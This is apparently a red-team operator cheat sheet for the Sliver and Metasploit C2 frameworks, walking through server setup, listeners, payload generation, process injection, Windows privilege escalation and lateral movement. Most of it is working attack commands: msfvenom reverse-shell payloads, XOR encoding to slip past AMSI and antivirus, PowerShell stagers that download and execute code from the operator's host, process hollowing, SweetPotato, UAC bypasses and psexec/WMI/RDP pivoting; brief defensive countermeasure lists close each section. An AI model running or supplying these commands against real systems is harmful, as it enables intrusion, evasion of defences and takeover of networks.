01Setupサーバ / クライアント / Armory

Sliver operates as a client-server C2 with an optional multiplayer mode. Metasploit runs as a single-node console with a PostgreSQL backend for workspace and loot management. Both frameworks are installed once per operator machine and reused across engagements.

Sliver — Server

Fetch the pre-compiled server binary from BishopFox releases. Multiplayer mode must be explicitly enabled before any operator can attach.

bash
# Install and launch server
wget -q https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
chmod +x ./sliver-server_linux
./sliver-server_linux

# Generate operator profile (from within server console)
[server] sliver > new-operator -n <OPERATOR> -l <LHOST>
[*] Saved new client config to: /<path>/<OPERATOR>_<LHOST>.cfg

# Enable multiplayer (required for remote client attach)
[server] sliver > multiplayer
[*] Multiplayer mode enabled!

Sliver — Client

bash
wget -q https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux
chmod +x ./sliver-client_linux
./sliver-client_linux import /<path>/<OPERATOR>_<LHOST>.cfg
./sliver-client_linux

Sliver — Armory

The Armory ships 20+ aliases (BOFs and .NET assemblies) and 100+ extensions covering situational awareness, credential access, and lateral movement. Install once per client.

sliver
sliver > armory install all

# Individual install
sliver > armory install sharpsh
sliver > armory install stracciatella
sliver > armory install rubeus

Metasploit — Console & Workspace

Ensure the PostgreSQL backend is running so db_status reports connected. Workspaces isolate hosts, credentials, and loot per engagement.

bash
sudo systemctl start postgresql
msfconsole -q
msfconsole
msf6 > db_status
msf6 > workspace -a <engagement>
msf6 > workspace <engagement>
msf6 > hosts
msf6 > services -p 445
noteSliver and Metasploit can coexist on the same operator host — Sliver for evasion-heavy engagements and MSF for rapid staging or post-exploitation modules. Cross-framework handoff is done via msfvenom shellcode fed into Sliver's execute-shellcode, or Sliver session drop into an MSF handler.
防御 / countermeasures
  • Egress detection on unauthorized outbound HTTPS/mTLS from operator subnets — C2 traffic often uses TLS pinning or self-signed certs, which SSL inspection can flag.
  • Endpoint EDR baselines catching Sliver's default implant signatures (obfuscation reduces but does not eliminate this).
  • Blue-team infrastructure enumeration: Shodan / Censys fingerprint of exposed Sliver / MSF listeners.

02Listeners受信基盤

Listeners receive callbacks from implants. Sliver separates the listener (network binding) from the profile (payload metadata) — this lets you regenerate implants for a phantom listener or stage over TCP while keeping HTTP for the second stage. Metasploit uses exploit/multi/handler with matching payload options.

Sliver — HTTP / staged listeners

profiles new creates a reusable payload template; stage-listener serves stagers; http -L binds the actual reception endpoint.

sliver
# 64-bit shellcode-format profile + HTTP listener
profiles new --http <LHOST>:8088 --format shellcode http-x64
stage-listener --url tcp://<LHOST>:4443 --profile http-x64
http -L <LHOST> --lport 8088

# 32-bit variant (some AV pipelines process x86 differently)
profiles new --http <LHOST>:9090 --format shellcode -a x86 http-x86
stage-listener --url tcp://<LHOST>:5553 --profile http-x86
http -L <LHOST> --lport 9090

# Service-format profile for lateral movement (jump-psexec)
profiles new --http <LHOST>:8099 --format service svc-lateral
http -L <LHOST> --lport 8099

Sliver — mTLS / DNS listeners

sliver
# mTLS: encrypted mutual auth, blends with corporate mTLS
mtls -L <LHOST> --lport 8443

# DNS: covert channel via TXT records
dns -d <C2_DOMAIN> --no-canaries

Metasploit — multi/handler

Match the payload, LHOST, and LPORT exactly to what msfvenom produced. Use ExitOnSession false for persistent handlers accepting multiple callbacks.

msfconsole
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST <LHOST>
msf6 > set LPORT 4443
msf6 > set EXITFUNC thread
msf6 > set ExitOnSession false
msf6 > exploit -j

# Common payload alternates
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_winhttps
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp   # x86
noteFor HTTPS payloads set OverrideRequestHost true if traffic goes through a redirector; set StagerVerifySSLCert false only for self-signed testing (never in production engagements).
防御 / countermeasures
  • Anomaly detection on beacon regularity (fixed jitter/interval callbacks stand out in NetFlow / Zeek).
  • JA3/JA4 TLS fingerprinting against Sliver's Go TLS stack and MSF's Ruby stack.
  • Rare user-agent strings from unattended hosts; Sliver's default UA is well-catalogued.

03Payloads投下物

Sliver stages MSF-generated shellcode inside XOR-encoded launchers (VBA, PowerShell, C#, ASPX). Alternatively Sliver's native generate beacon produces standalone implants with evasion features. Metasploit's msfvenom is the ubiquitous shellcode generator underpinning both flows.

Metasploit — msfvenom shellcode

Raw shellcode output feeds every downstream encoding step. EXITFUNC=thread is safer than process for in-process execution (leaves host process alive).

bash
# x64 raw shellcode
sudo msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<LHOST> LPORT=4443 EXITFUNC=thread \
  -f raw -o <PAYLOAD_PATH>/payload.x64.bin

# x86 raw shellcode
sudo msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<LHOST> LPORT=5553 EXITFUNC=thread \
  -f raw -o <PAYLOAD_PATH>/payload.x86.bin

# Direct EXE (staged reverse_https, useful for AlwaysInstallElevated)
sudo msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=<LHOST> LPORT=8443 EXITFUNC=thread \
  -f exe -o <PAYLOAD_PATH>/payload.x64.exe

XOR-encoded launchers (from raw shellcode)

XOR with a single-byte key (2 in these examples) bypasses signature-based AMSI/AV pattern matches on raw meterpreter bytes. Change the key per engagement.

bash
# PowerShell $buf array (XOR key = 2)
sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4443 EXITFUNC=thread -f raw \
  | xxd -ps -c 1 \
  | python3 -c 'import sys; key = 2; print("[Byte[]] $buf = " + ",".join([f"0x{(int(x, 16) ^ key):02X}" for x in sys.stdin.read().split()]))'

# C# byte[] buf (XOR key = 2)
sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4443 EXITFUNC=thread -f raw \
  | python3 -c 'key = 2; import sys; data = sys.stdin.buffer.read(); enc = bytes([b ^ key for b in data]); print(f"byte[] buf = new byte[{len(enc)}] {{ " + ", ".join([f"0x{b:02X}" for b in enc]) + " };")'

# VBA / VBS Array (XOR key = 2, chunked for line-length limits)
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=5553 EXITFUNC=thread -f raw \
  | xxd -ps -c 1 \
  | python3 -c 'import sys; key = 2; data = [str(int(x, 16) ^ key) for x in sys.stdin.read().split()]; cs = 50; ck = [data[i:i+cs] for i in range(0, len(data), cs)]; print("buf = Array(", end=""); print(", _\n".join([", ".join(c) for c in ck]) + ")")'

PowerShell one-liner stager

Downloads a second-stage script from the operator's HTTP server and IEX-executes it. UTF-16LE + base64 encoding required by -EncodedCommand.

bash
echo -en "(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/payload.ps1') | IEX" \
  | iconv -t UTF-16LE | base64 -w 0

# On target
powershell -enc <BASE64_PAYLOAD>

Sliver — native beacon

Sliver's generate beacon produces a standalone implant with obfuscation and AMSI evasion built in. --evasion enables extra hardening at a size cost.

sliver
profiles new --http <LHOST>:8088 --format shellcode http-x64
http -L <LHOST> --lport 8088

generate beacon --http <STAGING>:8088 \
  --name payload.obfuscated --os windows \
  --seconds 5 --jitter 0 --evasion
防御 / countermeasures
  • YARA rules on the msfvenom shellcode prologue and Sliver's implant framing (both are publicly indexed).
  • AMSI: modern Defender detects the plaintext meterpreter blob; XOR + in-memory delivery mitigates this only when AMSI is bypassed (see evasion).
  • Egress DNS/HTTP logging catches stager fetches from unusual hosts.

04Session Opsセッション安定化

Initial callbacks are unstable — the host process (Word, browser, one-shot loader) can die or be sandboxed. Migration into a stable, long-lived process (explorer, svchost, notepad) is standard hygiene. Sliver offers migrate, execute-shellcode -p, and hollow; Metasploit exposes the classic migrate command plus post modules.

Sliver — sacrificial process + injection

Spawn a target process first (so it belongs to the current user context), enumerate its PID, then inject. Notepad is the canonical sacrifice; svchost is preferred for hollowing.

sliver
# Launch sacrificial process (match arch to your shellcode)
execute C:\\windows\\system32\\notepad.exe
execute -T notepad
execute C:\\windows\\SysWOW64\\notepad.exe   # x86

# Or via Rubeus createnetonly (creates process in alt logon context)
rubeus -t 20 -- createnetonly /program:C:\\windows\\SysWOW64\\notepad.exe
rubeus -t 20 -- createnetonly /program:C:\\windows\\system32\\cmd.exe

# Find the PID
ps -e notepad
ps -e explorer   # explorer.exe = long-lived host, ideal for beacons

Sliver — inject shellcode into PID

sliver
# x86 injection (arch auto-detected)
execute-shellcode -A 386 -p <PID> <PAYLOAD_PATH>/payload.x86.bin
execute-shellcode -p <PID> <PAYLOAD_PATH>/payload.x86.bin

# x64 injection with ShikataGaNai encoding + reflection
execute-shellcode -p <PID> <PAYLOAD_PATH>/payload.x64.bin
execute-shellcode -S -r -I 10 -p <PID> <PAYLOAD_PATH>/payload.x64.bin

# Migration (native Sliver command)
migrate -p <PID>

Sliver — process hollowing

Hollowing creates a suspended svchost, unmaps its image, and writes shellcode into the freed region. High evasion value but sometimes throws a benign error post-injection.

sliver
hollow svchost.exe <PAYLOAD_PATH>/payload.x64.bin

# Expected benign error (shell still received):
[!] Call extension error: rpc error: code = Unknown desc = The parameter is incorrect.

Metasploit — migrate & post modules

meterpreter
meterpreter > ps
meterpreter > migrate <PID>
meterpreter > migrate -N explorer.exe   # by name
msfconsole
# Auto-migrate post module (finds a target and migrates)
msf6 > use post/windows/manage/migrate
msf6 > set SESSION <id>
msf6 > set NAME explorer.exe
msf6 > run

# Session persistence — auto-relaunch on session death
msf6 > use exploit/windows/local/persistence
msf6 > set SESSION <id>
msf6 > run
noteAlways duplicate the implant into a hollowed process before running anything AV-visible (SweetPotato, mimikatz). The primary implant remaining in a sacrificial notepad will get killed the moment defender wakes up.
要点 / key takeaways
  • Never operate from the initial callback process. Migrate immediately.
  • Match architecture explicitly: x86 shellcode in x64 process (or vice versa) will crash silently.
  • Hollowing is the most robust technique when EDR is present, at the cost of a spurious error message.

05Privilege Escalation権限昇格

Once a stable low-privilege session is established, enumerate escalation paths. Sliver runs C# assemblies in-process (execute-assembly -i) or side-loads via execute-assembly; PowerShell scripts pass through SharpSh with AMSI bypass. Metasploit's local_exploit_suggester maps kernel bugs; specific exploit modules handle SeImpersonate/UAC.

Enumeration — Sliver

sliver
# Identity / privileges via BOF (quieter than shell whoami)
sa-whoami
execute -o whoami /all

# Group / user context
seatbelt -- -group=all
seatbelt -- -group=user

# SharpUp — Windows privesc audit
sharpup -- audit
sharpup -i -- audit

# PowerUp via SharpSh
sharpsh -t 40 -- '-u http://<LHOST>/PowerUp.ps1 -c "Invoke-AllChecks"'

# winPEAS via SharpSh (long-running, 400s timeout)
sharpsh -t 400 -- '-u http://<LHOST>/winPEAS.ps1 -c 1'

Enumeration — Metasploit

msfconsole
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION <id>
msf6 > run

# Windows-specific privilege enumeration
msf6 > use post/windows/gather/win_privs
msf6 > use post/windows/gather/enum_patches

Modifiable Service

A misconfigured service whose ACL allows non-admin to modify binPath is exploited by rewriting the binary path to add the current user to Administrators, then restarting the service under SYSTEM.

sliver
# Inspect and rewrite service config (SNMPTRAP is a common misconfig example)
execute -o sc qc <SERVICE_NAME>
execute -o sc config <SERVICE_NAME> binPath= "net localgroup Administrators domain.com\\<USER> /add" obj= "NT AUTHORITY\\SYSTEM"
execute -o sc config <SERVICE_NAME> start= auto
execute -o sc start <SERVICE_NAME>

# Verify local admin membership
execute -o net localgroup administrators
msfconsole
msf6 > use exploit/windows/local/service_permissions
msf6 > set SESSION <id>
msf6 > run

SeImpersonate — SweetPotato

Any process holding SeImpersonatePrivilege (e.g., IIS worker, MSSQL service) can be leveraged via *Potato variants. SweetPotato with EfsRpc is reliable on modern Windows Server. Encode the payload with donut → inject via execute-shellcode.

bash
# Convert SweetPotato.exe to position-independent shellcode via donut
donut -i <TOOL_DIR>/SweetPotato.exe -a 2 -b 2 \
  -p "-p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a \"IEX((New-Object Net.WebClient).DownloadString('http://<LHOST>/payload.ps1'))\"" \
  -o <TOOL_DIR>/SweetPotato.bin

# EfsRpc variant (more reliable when default fails)
donut -i <TOOL_DIR>/SweetPotato.exe -a 2 -b 2 \
  -p "-e EfsRpc -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a \"IEX((New-Object Net.WebClient).DownloadString('http://<LHOST>/payload.ps1'))\"" \
  -o <TOOL_DIR>/SweetPotato.bin
sliver
# Sacrificial process + inject SweetPotato shellcode (recommended)
execute notepad
ps -e notepad
execute-shellcode -S -r -I 30 -p <PID> <TOOL_DIR>/SweetPotato.bin

# In-process variant (faster but less stable)
execute-shellcode -i -S -r -I 30 <TOOL_DIR>/SweetPotato.bin

# Direct assembly execution
execute-assembly <TOOL_DIR>/SweetPotato.exe \
  -p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \
  -a "-ep bypass -nop iex (New-Object Net.WebClient).DownloadString('http://<LHOST>/payload.ps1')"

# Immediately hollow the shell into svchost (AV kills SweetPotato host quickly)
hollow svchost.exe <PAYLOAD_PATH>/payload.x64.bin
msfconsole
# MSF equivalent — juicy potato (older Windows) or getsystem (varies)
msf6 > use exploit/windows/local/ms16_075_reflection_juicy
msf6 > set SESSION <id>
msf6 > run

meterpreter > getsystem   # tries token duplication / named pipe / rotten potato

AlwaysInstallElevated

When both HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated and its HKCU counterpart are set to 1, any MSI runs as SYSTEM. Build an MSI wrapping the implant EXE with wixl from the MSI-AlwaysInstallElevated template, then msiexec /qn /i http://....

bash
sudo apt install wixl
cd ~/tools
git clone https://github.com/KINGSABRI/MSI-AlwaysInstallElevated
cd MSI-AlwaysInstallElevated

# Drop the Sliver .exe implant into cwd
cp <PAYLOAD_PATH>/payload.x64.exe .

# Edit WXS-Templates/alwaysInstallElevated-3.wxs line 15:
# Change  Source="setup.exe"  →  Source="payload.x64.exe"

wixl -v WXS-Templates/alwaysInstallElevated-3.wxs -o alwaysInstallElevated.msi
sudo cp alwaysInstallElevated.msi /var/www/html
sudo chmod 644 /var/www/html/alwaysInstallElevated.msi
sliver
execute -t 40 -o msiexec /qn /i http://<LHOST>/alwaysInstallElevated.msi
msfconsole
msf6 > use exploit/windows/local/always_install_elevated
msf6 > set SESSION <id>
msf6 > run

UAC Bypass — Fodhelper / ComputerDefaults

Auto-elevate binaries (fodhelper.exe, ComputerDefaults.exe) load handlers from HKCU without UAC prompt. Plant a registry key pointing to your payload, then launch the binary. Ideal to disable Defender first; the bypass itself is user-level.

sliver
# ComputerDefaults variant
sharpsh -- -c 'New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force'
sharpsh -- -c 'New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force'
execute -o powershell 'Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe /c powershell -w hidden -c <stager>" -Force'
execute -o powershell 'Start-Process "C:\Windows\System32\ComputerDefaults.exe"'

# Verify elevation
execute -o whoami /priv
sa-whoami
getsystem
sliver
# Fodhelper variant (equivalent registry, different auto-elevate binary)
sharpsh -- -c 'New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (iwr http://<LHOST>/payload.ps1 -usebasicparsing) | IEX" -Force'
sharpsh -- -c 'New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force'
execute -o powershell 'Start-Process "C:\Windows\System32\fodhelper.exe"'
msfconsole
msf6 > use exploit/windows/local/bypassuac_fodhelper
msf6 > set SESSION <id>
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 > set LHOST <LHOST>
msf6 > run

# Alternates
msf6 > use exploit/windows/local/bypassuac_comhijack
msf6 > use exploit/windows/local/bypassuac_eventvwr
msf6 > use exploit/windows/local/bypassuac_sdclt
防御 / countermeasures
  • Service ACL audit: Get-Acl on all services, alerting on non-admin write permissions.
  • SeImpersonatePrivilege only granted to expected accounts (LOCAL SERVICE, NETWORK SERVICE, IIS AppPool, MSSQL); anything else on a workstation is suspicious.
  • Disable AlwaysInstallElevated in Group Policy (default is disabled — its presence in HKLM is the misconfig).
  • UAC bypass detection: monitor HKCU registry writes to ms-settings\shell\open\command and unusual launches of fodhelper / ComputerDefaults from user context.

06Lateral Movement横展開

After privesc and credential access (see ad-compromise), pivot to adjacent hosts. Sliver's jump-* family provides one-liner beacon delivery; psexec is legacy but reliable; BOFs (sa-whoami) enumerate quietly on remote hosts. Metasploit uses exploit/windows/smb/psexec and its variants.

Sliver — BOF enumeration on remote context

BOFs execute inline in the implant process — no new process, no whoami.exe spawning, much quieter for EDR.

sliver
sa-whoami

[*] Successfully executed sa-whoami
[*] Got output:

UserName        SID
====================== ====================================
...

GROUP INFORMATION                                 Type                     SID
================================================= ===================== ============================================================
Everyone                                          Well-known group         S-1-1-0
...

Sliver — psexec (classic service-based)

Requires a service-format profile and a corresponding HTTP listener on the operator. Sliver drops a service binary, registers it, and starts it — the beacon calls back through the listener.

sliver
psexec -d <SVC_TITLE> -s <SVC_DESC> -p svc-lateral <TARGET>
psexec -d <SVC_TITLE> -s <SVC_DESC> -p svc-lateral <DC>

# Attach to the new session
use <session_id>

Sliver — jump-psexec (one-liner drop & run)

sliver
jump-psexec <TARGET> <SVC_NAME> <PAYLOAD_PATH>/payload.x64.exe //<TARGET>/c$/second.exe

Sliver — jump-wmiexec

WMI-based execution avoids service creation (no services.exe child, no 7045 event log). The command runs under wmiprvse.exe.

sliver
jump-wmiexec <TARGET> 'powershell -w hidden -enc <BASE64_PAYLOAD>'

Sliver — SharpRDP (RDP-based execution)

Executes commands via RDP's virtual channel without a full desktop session. Useful when SMB/WMI are blocked but RDP is allowed. Sometimes hangs post-auth on modern RDP; test in isolation before relying on it.

sliver
# Upload SharpRDP and invoke
upload <TOOL_DIR>/SharpRDP.exe c:/windows/temp/sharprdp.exe
cd c:/windows/temp/

c:/windows/temp/sharprdp.exe computername=<TARGET> command=calc \
  username=<DOMAIN>\\<USER> password="<PASSWORD>"

c:/windows/temp/sharprdp.exe computername=<TARGET> \
  command="powershell -w hidden -enc <BASE64_PAYLOAD>" \
  username=<DOMAIN>\\<USER> password="<PASSWORD>"

# Direct assembly execution via Sliver
sharprdp -- computername=<TARGET> password=<PASSWORD> username=Administrator \
  command=C:\\Windows\\Temp\\second.beacon.exe

Metasploit — routing & pivot

msfconsole
# Autoroute through existing session (pivots subsequent modules through target)
msf6 > use post/multi/manage/autoroute
msf6 > set SESSION <id>
msf6 > set SUBNET <TARGET_SUBNET/24>
msf6 > run

# SOCKS proxy to route external tools
msf6 > use auxiliary/server/socks_proxy
msf6 > set VERSION 5
msf6 > run -j
noteSliver jump-* commands do not natively accept NTLM hashes — the current implant must already hold a session token to the target. Use make-token or Rubeus createnetonly to establish the auth context first. MSF's psexec accepts hashes directly.
防御 / countermeasures
  • Sysmon Event ID 1 (process creation) with ParentImage=services.exe and unusual child — catches psexec service drops.
  • Event ID 4624 (logon) type 3 (network) from workstations to workstations without justification — anomalous laterally.
  • Event ID 5140 (share access) for admin$ / c$ from non-admin sources.
  • WMI logging (Microsoft-Windows-WMI-Activity/Operational) — jump-wmiexec and equivalents leave traces.
  • Restrict RDP (network-level auth, jump servers, monitor SharpRDP-signature virtual channel patterns).
